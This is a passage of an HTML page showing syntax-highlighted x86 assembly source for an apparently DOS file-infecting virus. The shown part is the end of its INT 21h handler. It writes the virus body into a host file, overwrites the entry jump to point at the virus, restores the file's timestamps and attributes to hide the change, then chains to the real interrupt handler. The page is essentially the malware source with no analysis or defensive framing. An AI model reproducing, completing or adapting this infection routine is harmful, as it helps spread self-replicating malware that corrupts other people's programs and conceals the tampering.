           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01E0h</span><span class="sc0">   </span><span class="sc1">;dx = write from here</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Set PTR @BOF</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
        
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">  
           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">cwd</span><span class="sc0">               </span><span class="sc1">;cx = dx = 00</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Write new jump</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; # of bytes to write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">NEW_HOST_ENTRYY</span><span class="sc0">        </span><span class="sc1">;dx = write from here</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">      </span><span class="sc1">;insert new address</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc5">CLOSE_FILE</span><span class="sc4">:</span><span class="sc0">                
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Restore Date &amp; time</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
         
           </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;restore time</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;restore date</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Klose File</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0"> 
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
         
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Restore Attributes</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">;ds:dx = pathname to file</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">         </span><span class="sc1">;restore pathname</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;restore old attributes</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Restore registers</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc5">EXIT_HANDLER</span><span class="sc4">:</span><span class="sc0">                   
         </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
        
</span><span class="sc5">QUICK_OUT</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0EAh</span><span class="sc0">       </span><span class="sc1">; jmp OFFSET:SEGMENT</span><span class="sc0">
</span><span class="sc5">END_VIRUS</span><span class="sc4">:</span><span class="sc0">                
</span><span class="sc5">REAL_INT_21</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">ZIZE</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">END_VIRUS</span><span class="sc0">              </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0"> 
</span><span class="sc5">REALL_INT_21</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">REAL_INT_21</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
</span><span class="sc5">HOST_STUBB</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HOST_STUB</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">     
</span><span class="sc5">NEW_HOST_ENTRYY</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01E0h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_HOST_ENTRY</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0">             </span><span class="sc5">START</span><span class="sc0">
        

</span></div></body>
</html>
